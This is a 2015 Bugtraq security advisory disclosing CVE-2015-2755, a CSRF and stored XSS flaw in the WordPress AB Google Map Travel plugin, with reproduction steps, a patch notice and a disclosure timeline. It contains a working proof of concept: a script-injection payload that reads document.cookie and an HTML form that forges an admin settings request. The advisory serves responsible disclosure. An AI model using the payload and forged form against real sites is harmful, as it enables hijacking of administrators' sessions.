
Date: Fri, 27 Mar 2015 20:19:21 GMT
From: kingkaustubh@...com
To: bugtraq@...urityfocus.com
Subject: CVE-2015-2755 WordPress AB Google Map Travel CSRF / XSS

===============================================================================
CSRF/Stored XSS Vulnerability in AB Google Map Travel (AB-MAP) Wordpress Plugin 
===============================================================================

. contents:: Table Of Content

Overview
========

* Title :Stored XSS Vulnerability in AB Google Map Travel (AB-MAP) Wordpress Plugin 
* Author: Kaustubh G. Padwad
* Plugin Homepage: https://wordpress.org/plugins/ab-google-map-travel/
* Severity: HIGH
* Version Affected: Version 3.4  and mostly prior to it
* Version Tested : Version  3.4
* version patched: 4.0 
* CVE ID : CVE-2015-2755
Description 
===========

Vulnerable Parameter  
--------------------

* Latitude:
* Longitude:
* Map Width:
* Map Height:
* Map Zoom:
* And all Input Boxes


 	
About Vulnerability
-------------------
This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, adminï¿½s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 

Vulnerability Class
===================     
Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
Cross Site Scripting       (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS) 

Steps to Reproduce: (POC)
=========================

After installing the plugin
After installing the plugin

1. Goto settings -> Google Map Travel

2. Insert this payload ## "> <script>+-+-1-+-+alert(document.cookie)</script> ## Into Any above mention Vulnerable parameter  
Save settings and see XSS in action

3. Visit Google Map Travel settings page of this plugin anytime later and you can see the script executing as it is stored.


Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below

<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/admin.php?page=ab_map_options" method="POST">
      <input type="hidden" name="lat" value="&quot;&gt;&#32;&lt;script&gt;&#43;&#45;&#43;&#45;1&#45;&#43;&#45;&#43;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;" />
<input type="hidden" name="long" value="76&#46;26730" />
      <input type="hidden" name="lang" value="en" />
      <input type="hidden" name="map&#95;width" value="500" />
      <input type="hidden" name="map&#95;height" value="300" />
      <input type="hidden" name="zoom" value="7" />
      <input type="hidden" name="day&#95;less&#95;five&#95;fare" value="llllll" />
      <input type="hidden" name="day&#95;more&#95;five&#95;fare" value="1&#46;5" />
      <input type="hidden" name="less&#95;five&#95;fare" value="3" />
      <input type="hidden" name="more&#95;five&#95;fare" value="2&#46;5" />
      <input type="hidden" name="curr&#95;format" value="&#36;" />
      <input type="hidden" name="submit" value="Update&#32;Settings" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

. image:: csrf.jpeg
   :height: 1000 px
   :width:  1000 px
   :scale: 100 %
   :alt: XSS POC
   :align: center




Mitigation 
==========
Update to version 4.0

Change Log
==========
https://wordpress.org/plugins/ab-google-map-travel/changelog/

Disclosure 
==========
07-March-2015 Reported to Developer
11-March-2015 Reported to Wordpress
11-March-2015 Acknowledgement from Developer
16-March-2015 Wordpress reviwed and publish the updated plugin.
16-March-2015 Requested for CVE ID
27-March-2015 CVE Assign 
28-March-2015 Reposted with CVE ID
   

credits
=======
* Kaustubh Padwad 
* Information Security Researcher
* kingkaustubh@...com 
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad
